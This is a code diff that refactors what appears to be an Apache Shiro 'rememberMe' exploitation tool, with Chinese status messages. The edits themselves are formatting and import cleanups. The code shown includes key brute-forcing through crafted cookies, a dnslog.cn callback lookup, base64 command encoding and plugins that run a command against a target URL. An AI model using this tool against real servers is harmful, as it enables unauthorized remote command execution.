@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 # _*_ coding:utf-8 _*_
+import base64
 import requests
 import time
 
@@ -52,13 +53,11 @@ class Idea(object):
     PLUGINS = {}
 
     def process(self, url, command, res_key, func, plugins=()):
-        if plugins is ():
+        if not plugins:
             for plugin_name in self.PLUGINS.keys():
                 try:
                     print("[*]开始检测模块", plugin_name)
-                    self.PLUGINS[plugin_name]().process(
-                        url, command, res_key, func
-                    )
+                    self.PLUGINS[plugin_name]().process(url, command, res_key, func)
                 except Exception as err:
                     print(err)
                     print("[-]{}检测失败，请检查网络连接或目标是否存活".format(plugin_name))
@@ -66,12 +65,10 @@ class Idea(object):
             for plugin_name in plugins:
                 try:
                     print("[*]开始检测 ", self.PLUGINS[plugin_name])
-                    self.PLUGINS[plugin_name]().process(url, command, 20,
-                                                        res_key, func)
+                    self.PLUGINS[plugin_name]().process(url, command, 20, res_key, func)
                 except Exception as err:
                     print(err)
-                    print("[-]{}检测失败，请检查网络连接或目标是否存活".format(
-                        self.PLUGINS[plugin_name]))
+                    print("[-]{}检测失败，请检查网络连接或目标是否存活".format(self.PLUGINS[plugin_name]))
         print("[+] 检测完毕!")
         return
 
@@ -84,12 +81,10 @@ class Idea(object):
                 key = y[0]
                 key_cookie = y[1]
                 header = {
-                    'User-agent': ('Mozilla/5.0 (Windows NT 6.2; WOW64; '
-                                   'rv:22.0) Gecko/20100101 Firefox/22.0;'),
+                    'User-agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;',
                     'Cookie': 'rememberMe={}'.format(key_cookie)
                 }
-                res = requests.post(url, headers=header, verify=False,
-                                    timeout=30)
+                res = requests.post(url, headers=header, verify=False, timeout=30)
                 if 'rememberMe' not in str(res.headers):
                     return key
                 else:
@@ -97,7 +92,6 @@ class Idea(object):
             return False
 
     def get_dnslog_cookie(self):
-        import requests
         dnslog = "http://dnslog.cn/getdomain.php"
         res = requests.get(dnslog, timeout=10)
         dnslog_url = res.text
@@ -106,7 +100,6 @@ class Idea(object):
         return dnslog_url, phpsessid
 
     def get_base64_command(self, command):
-        import base64
         base1 = str(base64.b64encode(str(command).encode(encoding='utf-8')))
         base2 = base1.replace("b'", "")
         base3 = base2.replace("'", "")
@@ -118,5 +111,4 @@ class Idea(object):
         def wrapper(plugin):
             cls.PLUGINS.update({plugin_name: plugin})
             return plugin
-
         return wrapper
